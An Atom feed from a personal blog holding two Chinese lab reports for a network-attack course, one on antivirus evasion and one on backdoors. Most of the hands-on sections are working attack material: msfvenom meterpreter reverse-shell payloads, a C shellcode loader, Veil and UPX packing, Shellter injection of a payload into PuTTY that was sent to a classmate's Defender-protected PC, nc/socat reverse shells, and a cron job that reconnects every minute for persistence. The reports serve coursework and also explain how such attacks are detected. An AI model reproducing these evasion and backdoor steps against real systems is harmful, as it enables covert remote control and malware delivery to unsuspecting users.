<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>Ethan Chase‘s Site</title>
    <link href="https://Ethan-Chase.github.io/feed.xml" rel="self" />
    <link href="https://Ethan-Chase.github.io" />
    <updated>2024-04-08T16:44:56+08:00</updated>
    <author>
        <name>Ethan Chase</name>
    </author>
    <id>https://Ethan-Chase.github.io</id>

    <entry>
        <title>第3次实验-免杀原理</title>
        <author>
            <name>Ethan Chase</name>
        </author>
        <link href="https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li-2.html"/>
        <id>https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li-2.html</id>
            <category term="网络对抗"/>

        <updated>2024-04-08T16:44:56+08:00</updated>
            <summary></summary>
        <content type="html">
            <![CDATA[
                <h1 id="第3次实验-免杀原理">第3次实验-免杀原理</h1>
<h2 id="1基础问题回答">1基础问题回答</h2>
<h3 id="（1）杀软是如何检测出恶意代码的？">（1）杀软是如何检测出恶意代码的？</h3>
<p>杀毒软件检测恶意代码的主要方法包括：</p><ul>
<li><strong>签名检测</strong>：这是最传统的方法，依赖于一个不断更新的恶意软件签名数据库。杀软通过比对文件的特征码（签名）与已知恶意软件的特征码进行匹配来检测恶意代码。</li>
<li><strong>行为分析</strong>：杀软监控程序的行为，包括对文件、网络、系统资源的访问和修改。如果软件的行为模式与已知的恶意行为模式匹配，则可能被判定为恶意软件。</li>
<li><strong>启发式分析</strong>：利用启发式算法分析未知软件的行为和代码结构，尝试发现未知的或变种的恶意软件。这种方法不仅仅依赖于已知的恶意软件数据库，而是尝试识别新的威胁。</li>
<li><strong>沙箱执行</strong>：在一个隔离的环境（沙箱）中执行程序，分析其行为，从而不对实际系统造成影响。如果程序在沙箱中表现出恶意行为，那么它就可能被识别为恶意软件。</li>
<li><strong>云检测</strong>：借助云计算技术，杀软可以迅速分析大量数据，识别新出现的恶意软件。这种方法可以有效地提高检测的速度和准确性。</li>
</ul>
<h3 id="（2）免杀是做什么？">（2）免杀是做什么？</h3>
<p>免杀是指通过各种技术手段避免恶意软件被杀毒软件检测到的行为。这通常涉及到对恶意软件代码的修改，使其能够绕过安全软件的检测机制，从而在未被发现的情况下在目标系统上执行。</p><h3 id="（3）免杀的基本方法有哪些？">（3）免杀的基本方法有哪些？</h3>
<h4 id="①改变特征码">①改变特征码</h4>
<ul>
<li>加壳</li>
<li>用encode进行编码</li>
<li>用其他语言进行重写再编译</li>
</ul>
<h4 id="②改变行为">②改变行为</h4>
<ul>
<li><p>改变通讯方式</p><ul>
<li>尽量使用反弹式连接</li>
<li>使用隧道技术</li>
<li>加密通讯数据</li>
</ul>
</li>
<li><p>改变操作模式</p><ul>
<li>基于内存操作</li>
<li>减少对系统的修改</li>
</ul>
</li>
</ul>
<h4 id="③非常规方法">③非常规方法</h4>
<ul>
<li>使用一个有漏洞的应用当成后门，编写攻击代码集成到如MSF中。</li>
<li>使用社工类攻击，诱骗目标关闭AV软件。</li>
<li>纯手工打造一个恶意软件。</li>
</ul>
<h3 id="（4）开启杀软能绝对防止电脑中恶意代码吗？">（4）开启杀软能绝对防止电脑中恶意代码吗？</h3>
<p>开启杀毒软件不能绝对防止电脑中恶意代码的感染。虽然杀软可以大幅度提高安全性，减少恶意软件的威胁，但因为以下原因，它不能提供100%的保护：</p><ul>
<li>新出现的恶意软件或变种可能还未被安全厂商发现，因此未被加入到签名数据库中。</li>
<li>免杀技术的发展使得恶意软件能够绕过杀软的检测机制。</li>
<li>用户的不安全行为，如点击未知链接、下载不安全的附件等，也可能导致安全防护措施被绕过。</li>
</ul>
<h2 id="2实验内容">2实验内容</h2>
<h3 id="20免杀检测网站">2.0免杀检测网站</h3>
<p>VirusTotal、Virscan</p><ul>
<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li><a href="http://www.virscan.org/">http://www.virscan.org/</a></li>
</ul>
<blockquote>
<p>本次实验中使用VirusTotal进行检测</p></blockquote>
<h3 id="21直接使用msf生成的可执行文件进行检测">2.1直接使用msf生成的可执行文件进行检测</h3>
<p>生成可执行文件</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_1.exe
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042319100.png" alt="image-20240326042319100"  data-is-external-image="true"></figure><h3 id="22使用编码器编码编码后再次进行检测">2.2使用编码器编码编码后再次进行检测</h3>
<pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b &#39;\x00&#39; LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_2.exe
</code></pre>
<p>没有用~</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042817836.png" alt="image-20240326042817836"  data-is-external-image="true"></figure><h3 id="23使用编码器编码编码20次后再次进行检测">2.3使用编码器编码编码20次后再次进行检测</h3>
<pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_3.exe
</code></pre>
<p>你就说有没有变好吧</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326043020028.png" alt="image-20240326043020028"  data-is-external-image="true"></figure><h3 id="24使用veil">2.4使用Veil</h3>
<h4 id="安装之前最好照个快照，要是哪里不行了可以随时回档！！！">安装之前最好照个快照，要是哪里不行了可以随时回档！！！</h4>
<blockquote>
<p>不知道什么是快照的去<a href="https://blog.csdn.net/Dong_Alex/article/details/103547869">VMware虚拟机快照功能_虚拟机恢复快照是什么意思-CSDN博客</a></p></blockquote>
<p><strong>最理想的情况：</strong></p><p>安装Veil(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)</p><pre><code class="language-shell">sudo apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
</code></pre>
<blockquote>
<p>[!NOTE]</p><p>如果卡在这种程序安装的地方的话还是点一下，全部都是默认即可，一路Next到底</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/4cacc6e98c1979b37fb678b63bf89ce.png" alt="4cacc6e98c1979b37fb678b63bf89ce"  data-is-external-image="true"></figure></blockquote>
<p>打开Veil-Evasion</p><pre><code class="language-shell">veil
</code></pre>
<blockquote>
<p>使用方法参考博客:<a href="https://blog.csdn.net/qq_41453285/article/details/93538838?ops_request_misc=%7B%22request%5Fid%22%3A%22171140197316800188574575%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=171140197316800188574575&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-93538838-null-null.nonecase&utm_term=veil&spm=1018.2226.3001.4450">Kali——绕过杀毒软件检测工具Veil-Evasion_veil 工具原理-CSDN博客</a></p></blockquote>
<pre><code class="language-shell">use 1
use 7
set LHOST 192.168.255.137
set LPORT 4325
options
generate
</code></pre>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053010155.png" alt="image-20240326053010155"  data-is-external-image="true"></figure><p>好了一点</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053056315.png" alt="image-20240326053056315"  data-is-external-image="true"></figure><p>在windows下运行payload.exe尝试攻击</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328135351722.png" alt="image-20240328135351722"  data-is-external-image="true"></figure><p>攻击成功</p><h3 id="25c语言调用">2.5C语言调用</h3>
<h4 id="第一次攻击失败">第一次攻击——失败</h4>
<p>先用msf生成一段C语言格式的shellcode数组</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f c &gt; shellcode_win_4325.c
</code></pre>
<p>在文件中添加</p><pre><code class="language-c">int main()
{
        int (*func)() = (int(*)())buf;
        func();
}
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326054116189.png" alt="image-20240326054116189"  data-is-external-image="true"></figure><p>静态编译防止动态连接丢失</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static
</code></pre>
<p>没有MinGW-w64的可以安装一下:</p><pre><code class="language-shell">sudo apt install mingw-w64
</code></pre>
<p>另外一种安装方式：</p><p><a href="https://command-not-found.com/i686-w64-mingw32-c++">command-not-found.com – i686-w64-mingw32-c++</a></p><pre><code class="language-shell">apt-get install g++-mingw-w64-i686
</code></pre>
<p>结果更好了</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326055049121.png" alt="image-20240326055049121"  data-is-external-image="true"></figure><p>尝试攻击</p><pre><code class="language-shell">msfconsole
</code></pre>
<pre><code class="language-shell">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.255.137
set LPORT 4325
</code></pre>
<pre><code class="language-shell">options
</code></pre>
<pre><code class="language-shell">run
</code></pre>
<p>无法连接</p><h4 id="分析失败原因-by-20214321吴萌源">分析失败原因-by 20214321吴萌源</h4>
<p>通过对编译后的exe进行debug分析问题所在</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/dbg%E6%89%BE%E5%87%BA%E9%97%AE%E9%A2%98.gif" alt="dbg找出问题"  data-is-external-image="true"></figure><p>发现异常后通过文心一言确定问题</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/36f23d9f4397d7f25e75a59bf19562a.png" alt="36f23d9f4397d7f25e75a59bf19562a"  data-is-external-image="true"></figure><p>让文心一言给出修改方案</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/70f3be2fe1162626bfc1385bf596b26.png" alt="70f3be2fe1162626bfc1385bf596b26"  data-is-external-image="true"></figure><h4 id="第二次攻击成功">第二次攻击——成功</h4>
<blockquote>
<p>再次感谢20214321吴萌源同学的帮助</p></blockquote>
<p>还是先用msf生成一段C语言格式的shellcode数组</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f c &gt; shellcode_win_4325.c
</code></pre>
<p>修改在文件中添加为：</p><pre><code class="language-c">#include &lt;windows.h&gt;  
#include &lt;iostream&gt;  
int main() {  
    // 分配可执行内存  
    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (execMem == NULL) {  
        std::cerr &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl;  
        return 1;  
    }  
   // 复制shellcode到可执行内存  
    memcpy(execMem, buf, sizeof(buf));   
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  
    if (thread == NULL) {  
        std::cerr &lt;&lt; &quot;Thread creation failed!&quot; &lt;&lt; std::endl;  
        VirtualFree(execMem, 0, MEM_RELEASE);  
        return 1;  
    }  
    WaitForSingleObject(thread, INFINITE);  
    CloseHandle(thread);  
    VirtualFree(execMem, 0, MEM_RELEASE);  
    return 0;  
}
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png" alt="image-20240404140410028"  data-is-external-image="true"></figure><p>静态编译防止动态连接丢失</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static
</code></pre>
<p>尝试攻击</p><pre><code class="language-shell">msfconsole
</code></pre>
<pre><code class="language-shell">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.255.137
set LPORT 4325
</code></pre>
<pre><code class="language-shell">options
</code></pre>
<pre><code class="language-shell">run
</code></pre>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140610410.png" alt="image-20240404140610410"  data-is-external-image="true"></figure><p>攻击成功！</p><p>最后再给virustotal鉴定一下：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404141200950.png" alt="image-20240404141200950"  data-is-external-image="true"></figure><h3 id="26加壳">2.6加壳</h3>
<h4 id="使用upx对backdoor_20214325exe进行加壳">使用upx对backdoor_20214325.exe进行加壳</h4>
<pre><code class="language-shell">upx backdoor_20214325.exe -o backdoor_20214325_ups.exe
</code></pre>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/2c787368482691a58ada343863f17b6.png" alt="2c787368482691a58ada343863f17b6"  data-is-external-image="true"></figure><p>运行backdoor_20214325_ups.exe后攻击成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328144030424.png" alt="image-20240328144030424"  data-is-external-image="true"></figure><p>测一测，比不加壳之前（58/72）好了一点点</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/6d3b5694781debe56a963570beb9332.png" alt="6d3b5694781debe56a963570beb9332"  data-is-external-image="true"></figure><h4 id="使用upx对paylodexe进行加壳">使用upx对paylod.exe进行加壳</h4>
<pre><code class="language-shell">upx paylod.exe -o paylod_upx.exe
</code></pre>
<figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142401115.png" alt="image-20240328142401115"  data-is-external-image="true"></figure><p>运行paylod_upx.exe后攻击成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142451614.png" alt="image-20240328142451614"  data-is-external-image="true"></figure><p>测一下，反向升级了。。。</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142707459.png" alt="image-20240328142707459"  data-is-external-image="true"></figure><h3 id="27-通过组合应用各种技术实现恶意代码免杀">2.7 通过组合应用各种技术实现恶意代码免杀</h3>
<p>生成后门软件PuttY_upx.exe，成功与Windows Defender共存，详细见2.8</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png" alt=""  data-is-external-image="true"></figure><h3 id="28-附加题：用另一电脑实测，在杀软开启的情况下，可运行并回连成功，注明电脑的杀软名称与版本">2.8 附加题：用另一电脑实测，在杀软开启的情况下，可运行并回连成功，注明电脑的杀软名称与版本</h3>
<p>使用<a href="https://www.shellterproject.com/introducing-shellter/">Shellter | Shellter (shellterproject.com)</a>向PUTTY.exe注入shellcode后再使用pux进行加壳</p><p>使用微信发送到打开了Windows Defender的<em>20214321吴萌源</em>的电脑上，没有被当成病毒杀掉，成功绕过了的防护</p><p>之前尝试被杀掉的：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/a0eaad7b665b40c15454131502b3cc7.png" alt="a0eaad7b665b40c15454131502b3cc7"  data-is-external-image="true"></figure><p>幸存下来的putty_upx.exe：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png" alt="3621edfb11518f2f636ae3a2783dbb0"  data-is-external-image="true"></figure><p>杀软版本：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/bb813546bcc212148e19e4b7a143ff5.png" alt="bb813546bcc212148e19e4b7a143ff5"  data-is-external-image="true"></figure><p>使用快速扫描：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/7c0c5ade859663b19cbfb4557e07768.png" alt="7c0c5ade859663b19cbfb4557e07768"  data-is-external-image="true"></figure><p>在运行之后putty_upx.exe之后攻击成功，但是在使用ls命令后后门程序马上就被删除了</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/7571a791881b9534995b80c30d6b046.png" alt="7571a791881b9534995b80c30d6b046"  data-is-external-image="true"></figure><p>再次发送putty_upx.exe并重新尝试，在攻击之后文件依然没有被杀软删掉，但是不久之后就显示session died</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/b0c406b36ee60d134b9dfcd21bbaec3.png" alt="b0c406b36ee60d134b9dfcd21bbaec3"  data-is-external-image="true"></figure><p>使用screenshot屏幕截图：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240330194909289.png" alt="image-20240330194909289"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/4c345e413d7bb5efcb9b117ac3fb90c.png" alt="4c345e413d7bb5efcb9b117ac3fb90c"  data-is-external-image="true"></figure><h2 id="3实验总结与体会">3实验总结与体会</h2>
<p>通过本次实验，我学会了msf中编码器的使用，veil攻击平台的使用、upx加壳等基础的免杀操作，了解了VirusTotal、Virscan等免杀检测网站</p><p>在附加题中，我通过在网上找到的攻击平台Shellter组合加壳的操作实现了初步绕过windows defender的检测，并对在同一局域网下的其他电脑成功发动了攻击</p><h2 id="4遇到的问题与解决方法">4遇到的问题与解决方法</h2>
<h3 id="41veil安装">4.1Veil安装</h3>
<p>在第一次安装veil时由于其安装过程较慢，我以为是卡住了，按Ctrl + C打断之后重新安装出错，反复使用apt remove后重新安装依然无法解决，每次都会卡在<code>wine :failed to open L&quot;c:\\windows\\syswow64\\rundll32.exe&quot;: c0000135</code></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240331110432.png" alt="微信图片_20240331110432"  data-is-external-image="true"></figure><p>最后重装kali系统，并直接运行(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)后解决</p><pre><code class="language-shell">apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
</code></pre>
<h3 id="42c语言交叉编译">4.2C语言交叉编译</h3>
<p>使用</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static-libgcc
</code></pre>
<p>编译exe后，在windows中运行exe文件后无法成功攻击</p><p>使用</p><pre><code class="language-shell">gcc -m32 -no-pie -fno-pie shellcode_linux_4325.c -o shellcode_linux_4325
</code></pre>
<p>编译后</p><pre><code class="language-shell">┌──(root㉿kali)-[/home/kali/Desktop]
└─# file shellcode_linux_4325                                               
shellcode_linux_4325: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=38f5903779f6999ff273683ffc071706f17db8f6, for GNU/Linux 3.2.0, not stripped
</code></pre>
<p>关闭地址随机化，打开堆栈可执行后再次尝试，依然无法解决</p><p>最后在参考<strong>20214321吴萌源</strong>同学的方法后成功攻击</p><p>问题是由于buf中的程序不可执行导致，将文件后添加从</p><pre><code class="language-c">int main()
{
        int (*func)() = (int(*)())buf;
        func();
}
</code></pre>
<p>替换为即可解决</p><pre><code class="language-c">#include &lt;windows.h&gt;  
#include &lt;iostream&gt;  
int main() {  
    // 分配可执行内存  
    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (execMem == NULL) {  
        std::cerr &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl;  
        return 1;  
    }  
   // 复制shellcode到可执行内存  
    memcpy(execMem, buf, sizeof(buf));   
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  
    if (thread == NULL) {  
        std::cerr &lt;&lt; &quot;Thread creation failed!&quot; &lt;&lt; std::endl;  
        VirtualFree(execMem, 0, MEM_RELEASE);  
        return 1;  
    }  
    WaitForSingleObject(thread, INFINITE);  
    CloseHandle(thread);  
    VirtualFree(execMem, 0, MEM_RELEASE);  
    return 0;  
}
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png" alt="image-20240404140410028"  data-is-external-image="true"></figure>
            ]]>
        </content>
    </entry>
    <entry>
        <title>第2次实验-后门原理与实践</title>
        <author>
            <name>Ethan Chase</name>
        </author>
        <link href="https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html"/>
        <id>https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html</id>
            <category term="网络对抗"/>

        <updated>2024-04-08T15:54:27+08:00</updated>
            <summary></summary>
        <content type="html">
            <![CDATA[
                <h1 id="第2次实验-后门原理与实践">第2次实验-后门原理与实践</h1>
<h2 id="1基础问题回答">1基础问题回答</h2>
<h3 id="1例举你能想到的一个后门进入到你系统中的可能方式？">(1)例举你能想到的一个后门进入到你系统中的可能方式？</h3>
<p>一个常见的方式是通过未修补的软件漏洞。攻击者可以利用这些漏洞来执行远程代码，安装后门程序。例如，如果一个操作系统或应用软件存在已知但未被及时修补的安全漏洞，攻击者可以专门针对这个漏洞设计代码来获取系统的访问权限。</p><h3 id="2例举你知道的后门如何启动起来win及linux的方式？">(2)例举你知道的后门如何启动起来(win及linux)的方式？</h3>
<ul>
<li><strong>Windows:</strong> 一个常见的启动后门的方式是通过修改注册表来确保恶意软件每次启动时自动运行。例如，攻击者可能会在<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>键下添加一个条目，使其指向一个恶意程序。</li>
<li><strong>Linux:</strong> 在Linux系统中，攻击者可能会修改<code>/etc/rc.local</code>文件或者使用<code>cron</code>作业来确保后门在系统启动或定期时自动执行。通过这种方式，即使系统重启，后门程序也能自动运行。</li>
</ul>
<h3 id="3meterpreter有哪些给你映像深刻的功能？">(3)Meterpreter有哪些给你映像深刻的功能？</h3>
<ul>
<li><strong>屏幕截取和键盘记录：</strong> Meterpreter可以截取用户屏幕的快照，以及记录键盘输入，这使得攻击者可以远程监视用户的活动。</li>
<li><strong>提权：</strong> 通过各种技术，Meterpreter能够从普通用户权限提升到系统或管理员权限。</li>
<li><strong>隐形：</strong> Meterpreter能够通过各种手段隐藏其在系统中的存在，包括内存驻留而不是写入硬盘，以及清理日志记录等方式。</li>
<li><strong>数据窃取：</strong> Meterpreter可以窃取系统信息、文件以及其他敏感数据，并能够上传或下载文件，修改文件权限等。</li>
</ul>
<h3 id="4如何发现自己有系统有没有被安装后门？">(4)如何发现自己有系统有没有被安装后门？</h3>
<ul>
<li><strong>使用安全软件：</strong> 安装和使用安全软件，如防病毒和反恶意软件工具，这些工具可以帮助检测和移除后门程序。</li>
<li><strong>检查系统启动项和运行中的进程：</strong> 审查系统的启动项和当前运行的进程列表，寻找任何异常或不认识的条目。在Windows中，可以使用任务管理器和<code>msconfig</code>；在Linux中，可以使用<code>ps</code>命令和<code>cron</code>作业列表。</li>
<li><strong>网络监控：</strong> 使用网络监控工具来检测异常的出站连接。后门程序通常会尝试与远程服务器通信，这可能会在网络流量分析中显示出来。</li>
<li><strong>系统日志：</strong> 检查系统日志文件，寻找异常的登录尝试、权限提升活动或其他可疑行为的迹象。</li>
</ul>
<h2 id="2实验内容">2实验内容</h2>
<h3 id="20环境准备与基础知识">2.0环境准备与基础知识</h3>
<h4 id="201ncat">2.0.1Ncat</h4>
<p>Ncat 是一个功能丰富的网络工具，它继承自原始的 Netcat 工具的灵活性，并加入了更多的功能和改进。Ncat 作为 Nmap 项目的一部分，专为网络调试和探索而设计，可以用于创建任何类型的连接，包括 TCP、UDP、SCTP 和 Unix 域套接字连接。Ncat 的一些关键功能包括：</p><ul>
<li>支持 SSL 加密，允许安全地发送数据。</li>
<li>可以作为客户端和服务器运行，便于设置监听端口和接受连接。</li>
<li>提供内置的脚本引擎，允许用户执行特定的网络任务。</li>
<li>支持代理和代理链，使其能够通过各种网络层进行数据传输。</li>
</ul>
<h4 id="202socat">2.0.2Socat</h4>
<p>Socat 是一个命令行基础的多功能网络工具，它被认为比 Netcat 更加强大。Socat 能够处理双向数据传输，支持多种协议和数据类型，包括 IPv4、IPv6、TCP、UDP、Unix 域套接字等。它的一些高级功能包括：</p><ul>
<li>能够将几乎任何类型的数据流重定向到网络套接字、文件、管道、设备和程序之间。</li>
<li>支持 SSL 加密和认证，提供了数据传输的安全性。</li>
<li>具备端口重定向、网络桥接和代理功能。</li>
<li>可以用作网络调试工具，网络服务模拟器和为网络应用提供复杂的配置。</li>
</ul>
<blockquote>
<p>[!NOTE]</p><p>老师给的socat无法运行的可以前往<a href="https://github.com/honuonhval/socat-win10">honuonhval/socat-win10: Compiled socat for Windows 10 included instruction for reproducibility (github.com)</a>下载</p></blockquote>
<h4 id="203cron-启动">2.0.3Cron 启动</h4>
<p>Cron 是 Unix 和 Linux 系统中用于定时任务调度的服务。它允许用户安排在特定时间和日期自动运行脚本和命令。Cron 任务由 Cron 表（Crontab）管理，Crontab 文件包含了一系列的条目，每个条目代表一个定时任务。Cron 的使用场景包括定时备份、系统维护任务、定期检查系统状态等。</p><p>Cron 启动的任务通过编辑 Crontab 文件来配置。使用 <code>crontab -e</code> 命令可以编辑当前用户的 Crontab 文件，其中每一行代表一个任务，包括运行的时间和要执行的命令。</p><h4 id="204任务计划启动">2.0.4任务计划启动</h4>
<p>在 Windows 系统中，任务计划器（Task Scheduler）是一个图形界面工具，用于安排自动执行任务的时间。用户可以利用任务计划器在特定时间或当发生特定事件时自动启动程序或脚本。</p><p>任务计划器的使用场景非常广泛，包括自动备份、软件更新、系统维护等。创建新的任务时，可以配置多种设置，如触发器（定义任务何时运行）、操作（定义任务运行什么程序或脚本）、条件（定义任务运行的条件）和设置（进一步定义任务的行为）。</p><h3 id="21使用netcat获取主机操作shell，cron启动">2.1使用netcat获取主机操作Shell，cron启动</h3>
<h4 id="211win获得linux-shell">2.1.1Win获得Linux Shell</h4>
<p>1.windows 打开监听</p><pre><code class="language-sh">ncat.exe -l -p 4325
</code></pre>
<p>2.Linux反弹连接win</p><pre><code class="language-bash">nc 192.168.0.243 4325 -e /bin/sh
</code></pre>
<p>3.windows下获得一个linux shell，可运行任何指令，如ls</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323144818078.png" alt="image-20240323144818078"  data-is-external-image="true"></figure><h4 id="212corn启动">2.1.2corn启动</h4>
<p>想要在之后linux启动后就能获得其控制，便需要我们配置<strong>Cron定时任务</strong>，使linux每隔一段时间就进行反弹连接</p><p>1.打开corn配置</p><pre><code class="language-bash">crontab -e
</code></pre>
<p>2.添加任务使其每分钟尝试进行反弹连接</p><pre><code class="language-bash">* * * * * nc 192.168.0.243 4325 -e /bin/sh
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323152304381.png" alt="image-20240323152304381"  data-is-external-image="true"></figure><p>3.windos进行监听</p><pre><code class="language-sh">ncat.exe -l -p 4325
</code></pre>
<p>等待下次执行即可获得控制</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323152703554.png" alt="image-20240323152703554"  data-is-external-image="true"></figure><h4 id="213linux获得win-shell">2.1.3Linux获得Win Shell</h4>
<p>1.Linux运行监听指令</p><pre><code class="language-bash">nc -l -p 4325
</code></pre>
<p>2.Windows反弹连接Linux</p><pre><code class="language-sh">ncat.exe -e cmd.exe 192.168.255.137 4325
</code></pre>
<p>3.Linux下看到Windows的命令提示</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323145033335.png" alt="image-20240323145033335"  data-is-external-image="true"></figure><h3 id="22使用socat获取主机操作shell-任务计划启动">2.2使用socat获取主机操作Shell, 任务计划启动</h3>
<h4 id="220-socat基础使用">2.2.0 Socat基础使用</h4>
<p>监听端口</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre>
<p>远程连接端口</p><pre><code class="language-sh">socat - TCP:192.168.0.243:4325 
</code></pre>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323153648013.png" alt="image-20240323153648013"  data-is-external-image="true"></figure><h4 id="221win获得linux-shell">2.2.1Win获得Linux Shell</h4>
<p>1.windows 打开监听</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre>
<p>2.Linux反弹连接win</p><pre><code class="language-bash">socat TCP:192.168.0.243:4325 EXEC:&#39;/bin/sh&#39;,pty,stderr,setsid,sigint,sane
</code></pre>
<p>3.windows下获得一个linux shell，可运行任何指令，如ls</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323154111147.png" alt="image-20240323154111147"  data-is-external-image="true"></figure><h4 id="222linux获得win-shell">2.2.2Linux获得Win Shell</h4>
<p>1.Linux运行监听指令</p><pre><code class="language-sh">socat TCP-LISTEN:4325 -
</code></pre>
<p>2.Windows反弹连接Linux</p><pre><code class="language-sh">socat TCP:192.168.255.137:4325 EXEC:&#39;cmd.exe&#39;,pty,stderr,setsid,sigint,sane

ncat.exe -e cmd.exe 192.168.255.137 4325
</code></pre>
<p>3.Linux下看到Windows的命令提示</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240323154619694.png" alt="image-20240323154619694"  data-is-external-image="true"></figure><h4 id="223任务计划启动">2.2.3任务计划启动</h4>
